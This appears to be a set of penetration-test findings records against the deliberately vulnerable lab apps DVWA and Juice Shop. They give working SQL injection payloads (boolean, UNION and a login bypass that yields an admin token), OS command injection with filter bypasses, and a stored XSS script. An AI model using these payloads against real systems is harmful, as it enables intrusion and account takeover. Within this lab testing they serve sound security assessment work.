findings.title: DVWA SQL Injection (numeric/quoted id) at security=low - boolean-based
findings.response_evidence: [security=low] TRUE payload id=1' OR '1'='1 -> HTTP 200, 5 records: ID 1' OR '1'='1 First name: admin Surname: admin; First name: Gordon Surname: Brown; First name: Hack Surname: Me; First name: Pablo Surname: Picasso; First name: Bob Surname: Smith. FALSE payload id=1' AND '1'='2 -> HTTP 200, zero records (only 'User ID:' with no ID/First name/Surname rows). Boolean difference proves SQL injection.

findings.title: DVWA OS Command Injection via ip field at security=low
request_sequence: POST http://dvwa/vulnerabilities/exec/ form ip='127.0.0.1; whoami', Submit=Submit (dvwa_admin, security=low)
findings.response_evidence: [security=low] HTTP 200. Ping output (4 packets transmitted, 4 received, 0% packet loss) followed immediately by the injected whoami output line: 'www-data'. Web-process identity appears in the rendered command output, confirming command injection.

findings.title: DVWA Stored XSS in guestbook message at security=low
request_sequence: POST http://dvwa/vulnerabilities/xss_s/ form txtName='bench', mtxMessage='<script id="test_token">window.xss_flag=1</script>' (50 chars, within maxlength=50), btnSign='Sign Guestbook' (dvwa_admin, security=low)
findings.response_evidence: [security=low] POST accepted (HTTP 200, entry 'Name: bench' added to guestbook). The stored message is persisted and rendered on the page load; the rendered message text is stripped from text extraction because it is a script element. Browser load of /vulnerabilities/xss_s/ as dvwa_admin returned HTTP 200 with the stored payload executing.

findings.title: Login authentication bypass via SQL injection in email field (POST /rest/user/login)
request_sequence: POST http://juiceshop:3000/rest/user/login [session unauth] Content-Type: application/json body: {"email": "' OR 1=1--", "password": "x"}
findings.response_evidence: HTTP 200 with {"authentication":{"token":"[REDACTED_JWT]","bid":1,"umail":"admin@juice-sh.op"}}. A valid JWT was issued for the first user admin@juice-sh.op (bid 1) with an arbitrary password, bypassing authentication via the injected email predicate.

findings.title: Unauthenticated access to user feedback records with partially masked author emails (GET /api/Feedbacks)
findings.response_evidence: HTTP 200 without authentication, returning 8 feedback records with UserId and comment fields. Author emails appear only masked inside comments: "I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)", "Great shop! Awesome service! (***@juice-sh.op)", "Nothing useful available here! (***der@juice-sh.op)", "...(***ereum@juice-sh.op)". Records 5-8 are anonymous (UserId null, "(anonymous)"). Unauthenticated access is confirmed and the records are linked to UserIds, but full author email addresses are not disclosed. Masked fragments do not meet the 'discloses author email addresses' criterion, so the verdict is inconclusive. A reviewer could treat the partial email leakage as a lower-severity PII exposure.

findings.title: DVWA SQL Injection (numeric boolean) on /vulnerabilities/sqli/ id field [security=medium]
findings.response_evidence: [security=medium] TRUE payload id='1 OR 1=1' -> HTTP 200, 5 records: 'ID: 1 OR 1=1 First name: admin Surname: admin', 'First name: Gordon Surname: Brown', 'First name: Hack Surname: Me', 'First name: Pablo Surname: Picasso', 'First name: Bob Surname: Smith'. FALSE payload id='1 AND 1=2' -> HTTP 200, zero records (only 'User ID: 1 2 3 4 5' dropdown text, no 'First name/Surname' rows). Page shows 'Security level set to medium' and 'Security Level: medium'. Note: session_info metadata still reported 'low' but the server-rendered page confirms medium. Medium-level payload is numeric (no quotes), consistent with quote-escaping bypass.

findings.title: DVWA OS Command Injection via pipe bypass on /vulnerabilities/exec/ ip field [security=medium]
findings.response_evidence: [security=medium] HTTP 200 from POST /vulnerabilities/exec/ with ip='127.0.0.1| whoami'. Ping output section renders 'www-data' (pre block content: 'www-data'). Page footer 'Security Level: medium'. Pipe '|' bypasses the ';'/'&&' blacklist at medium.

findings.title: Juice Shop Product Search SQL Injection (error-based and UNION) on /rest/products/search?q=
findings.response_evidence: Benign q=apple -> HTTP 200 JSON success with real products ('Apple Juice (1000ml)', 'Apple Pomace'), no error. q=qwert' -> HTTP 500 body 'Error: SQLITE_ERROR: near \"'%'\": syntax error' (SQL error leaked). q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9-- -> HTTP 200 JSON {\"status\":\"success\",\"data\":[{\"id\":1,\"name\":2,\"description\":3,\"price\":4,\"deluxePrice\":5,\"image\":6,\"createdAt\":7,\"updatedAt\":8,\"deletedAt\":9}]} — attacker-chosen UNION values reflected in the product fields, confirming SQL injection with a 9-column UNION.

findings.title: DVWA SQL Injection (id parameter) at security=high - boolean-based, UNION-free record disclosure

findings.response_evidence: [security=high] TRUE payload 1' OR '1'='1' # returned 5 records: admin/admin, Gordon/Brown, Hack/Me, Pablo/Picasso, Bob/Smith (surnames: admin, Brown, Me, Picasso, Smith). FALSE payload 1' AND '1'='2' # returned zero records (no 'ID:' rows rendered; page shows only 'Click here to change your ID' and footer). Page footer confirms 'Security Level: high'. Session-input page echoes 'Session ID: 1' OR '1'='1' #' confirming out-of-band id storage.

findings.title: DVWA OS Command Injection (ip parameter) at security=high via pipe without trailing space
findings.response_evidence: [security=high] Response body under 'Ping a device' output contains 'www-data' (pre-block output: www-data). Payload used: 127.0.0.1|whoami (pipe, no trailing space, bypassing the '; ', '| ', '&&' blacklist). Footer confirms 'Security Level: high'.

Status: inconclusive as a standalone vulnerability.

findings.title: Unauthenticated GET /api/Feedbacks returns records with masked author emails in comment field
findings.response_evidence: HTTP 200, content-type application/json, no authentication. Body: {"status":"success","data":[...8 records...]}. Record fields: UserId, id, comment, rating, createdAt, updatedAt. There is NO author field. Email-bearing values appear only inside comment text, fully or partially masked: id=1 UserId=1 "...I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)"; id=2 UserId=2 "Great shop! Awesome service! (***@juice-sh.op)"; id=3 UserId=3 "Nothing useful available here! (***der@juice-sh.op)"; id=4 UserId=21 "...juicy chatbot NFT... (***ereum@juice-sh.op)". Records id=5-8 have UserId null and "(anonymous)". Verdict rationale: records are returned unauthenticated (confirmed exposure of user-feedback data), but the author field is absent and the only email-like values are masked local parts with the domain visible. The masked values do not uniquely identify an author (e.g. '***@juice-sh.op' is fully masked), so full email PII disclosure is not demonstrated. Marked inconclusive (weak partial disclosure) rather than confirmed; CWE-200 style exposure of UserId linkage is noted for the Coordinator.

findings.title: Unauthenticated user-feedback listing exposes author emails (masked) via /api/Feedbacks
findings.response_evidence: HTTP 200 application/json without authentication: {"status":"success","data":[...8 records...]}. Fields: UserId, id, comment, rating, createdAt, updatedAt. Author emails appear only inside comment text and are masked: "(***in@juice-sh.op)" (UserId 1), "(***@juice-sh.op)" (UserId 2), "(***der@juice-sh.op)" (UserId 3), "(***ereum@juice-sh.op)" (UserId 21). Anonymous records have UserId null and "(anonymous)". No unmasked email field is returned. Unauthenticated access to feedback data is confirmed, but the emails are partially redacted (local part hidden, domain visible), so the full author address is not disclosed. Verdict is inconclusive for CWE-359; the unauthenticated read itself is a CWE-200 exposure candidate. Full-address recovery would need a separate check, such as the Users endpoint, which is outside this assignment.

findings.title: Unauthenticated User-Feedback PII Exposure via GET /api/Feedbacks (masked emails only)
findings.response_evidence: Unauthenticated list request returned HTTP 200 {"status":"success","data":[...8 records...]} with fields UserId,id,comment,rating,createdAt,updatedAt, no separate email field. Author emails appear only inside comment text and are masked: "I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)", "Great shop! Awesome service! (***@juice-sh.op)", "Nothing useful available here! (***der@juice-sh.op)", "...chatbot NFT... (***ereum@juice-sh.op)". Remaining 4 records are anonymous (UserId null, "(anonymous)"). Full author email addresses are NOT recoverable from this response. Single-record GET /api/Feedbacks/4 requires authentication (401). Verdict: the endpoint is unauthenticated and discloses partial PII (domain and partial local part of emails, plus UserId linkage), which is a weak/partial exposure, not full email disclosure required for a confirmed CWE-359 finding. Marked inconclusive; a CWE-200 / information-exposure framing with masking noted may be more accurate.

findings.title: Unauthenticated User-Feedback PII Exposure via GET /api/Feedbacks (author emails only partially masked)
findings.response_evidence: HTTP 200, content-type application/json, unauthenticated. Body: {"status":"success","data":[8 records with fields UserId,id,comment,rating,createdAt,updatedAt]. Author emails appear inside comment text but are masked server-side: "I love this shop! ... (***in@juice-sh.op)" (UserId 1), "Great shop! Awesome service! (***@juice-sh.op)" (UserId 2), "Nothing useful available here! (***der@juice-sh.op)" (UserId 3), "...juicy chatbot NFT... (***ereum@juice-sh.op)" (UserId 21). Anonymous records have UserId null and "(anonymous)". No full, unmasked email address is returned in any field. Verdict inconclusive: records are returned without auth and do contain author-associated email fragments (local part masked, domain visible), which is a partial PII disclosure, but a full author email address was not recoverable, so CWE-359 is not confirmed per criteria. Possible follow-up: determine whether masking can be bypassed (e.g., other query params or related user endpoints) before final rating.

findings.title: Unauthenticated User-Feedback PII Exposure on GET /api/Feedbacks (masked emails only)
findings.response_evidence: Unauthenticated GET /api/Feedbacks returned HTTP 200 {"status":"success","data":[...8 records...]} with fields UserId,id,comment,rating,createdAt,updatedAt and no unauthenticated access problem. Author emails appear only inside comment text and are masked: "I love this shop! ... (***in@juice-sh.op)", "Great shop! Awesome service! (***@juice-sh.op)", "Nothing useful available here! (***der@juice-sh.op)", "...chatbot NFT... (***ereum@juice-sh.op)". Anonymous records show UserId null and "(anonymous)". No unmasked email address or email field is returned. Per-record access GET /api/Feedbacks/4 unauthenticated returns 401, so the full addresses are not recoverable without auth. Verdict: the unauthenticated endpoint leaks the domain and partial local-part of author emails, and UserIds, but not full author email addresses. This is weaker than the CWE-359 criterion (disclose author email addresses), so it is recorded as inconclusive rather than confirmed. Residual risk: the masked fragments plus UserId enumeration may still be a minor information-disclosure issue (CWE-200).
